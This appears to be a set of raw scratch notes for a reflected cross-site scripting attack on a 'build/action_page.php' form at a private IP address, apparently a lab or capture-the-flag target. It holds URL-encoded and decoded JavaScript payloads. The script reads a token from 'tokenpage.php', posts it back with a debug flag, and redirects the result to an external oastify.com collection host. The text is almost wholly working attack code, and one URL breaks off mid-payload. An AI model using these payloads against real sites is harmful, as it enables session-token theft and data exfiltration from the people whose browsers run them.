http://172.31.54.71/build/action_page.php?firstname=%3Cscript%3Ealert(1)%3Bfetch('http%3A%2F%2F172.31.54.71%2Fbuild%2Ftokenpage.php').then(r%3D%3Er.text()).then(h%3D%3E%7Blet%20t%3Dh.match(%2F%5Ba-zA-Z0-9%2F%2B%5D%7B20%2C%7D%3D%3D%3F%2F)%3Bif(!t)throw'No%20token'%3Blet%20b%3D%60token%3_



<script>
fetch('http://172.31.54.71/build/tokenpage.php')
  .then(r => r.text())
  .then(h => {
    let t = h.match(/[a-zA-Z0-9/+]{20,}={0,2}/);
    if (!t) throw 'No token';
    let b = `token=${encodeURIComponent(t[0])}&build=isdebug`;
    return fetch('http://172.31.54.71/build/tokenpage.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: b
    });
  })
  .then(r => r.text())
  .then(d => {
    location = 'https://nc37apiknos412ya0w3e9732rtxklc91.oastify.com/?data=' + encodeURIComponent(d);
  });
</script>


http://172.31.54.71/build/action_page.php?firstname=%3Cscript%3Ealert(1)%3Bfetch('http%3A%2F%2F172.31.54.71%2Fbuild%2Ftokenpage.php').then(r%3D%3Er.text()).then(h%3D%3E%7Blet%20t%3Dh.match(%2F%5Ba-zA-Z0-9%2F%2B%5D%7B20%2C%7D%3D%3D%3F%2F)%3Bif(!t)throw'No%20token'%3Blet%20b%3D%60token%3D%24%7BencodeURIComponent(t%5B0%5D)%7D%26build%3Disdebug%60%3Breturn%20fetch('http%3A%2F%2F172.31.54.71%2Fbuild%2Ftokenpage.php'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3Ab%7D)%7D).then(r%3D%3Er.text()).then(d%3D%3Elocation%3D'http://k8t8hjto28x6u3xvacjtncjb52btzond.oastify.com%2F%3Fdata%3D'%2BencodeURIComponent(d))%3B%3C%2Fscript%3Ealert




<script>
fetch('http://172.31.54.71/build/tokenpage.php')
  .then(response => response.text())
</script>
